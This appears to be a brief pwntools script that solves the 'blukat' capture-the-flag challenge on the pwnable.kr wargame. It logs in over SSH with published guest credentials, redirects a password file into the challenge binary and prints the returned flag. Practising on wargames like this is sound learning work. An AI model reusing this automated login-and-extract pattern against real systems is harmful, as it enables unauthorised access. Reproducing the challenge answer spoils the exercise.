from pwn import *

session = ssh('blukat', 'pwnable.kr', port=2222, password='guest')

io = session.process('sh')

io.sendline('./blukat < password')

io.recvuntil('flag: ')
print(io.recvline())
